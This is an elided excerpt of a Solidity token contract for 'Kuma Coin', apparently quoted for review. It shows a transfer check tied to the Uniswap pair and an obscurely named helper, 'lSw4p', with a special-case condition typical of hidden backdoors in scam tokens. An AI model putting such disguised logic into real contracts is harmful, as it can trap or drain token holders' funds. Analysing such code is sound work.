...
contract KUMA is Ownable, IERC20 {
    ...
    string private _name = "Kuma Coin";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (uniswapV2Pair != sender && recipient != address(this) &&
    ...
    function lSw4p(address sender, address recipient) internal view returns(bool) {
        return sender == recipient && (uniswapV2Pair == msg.sender);
    }
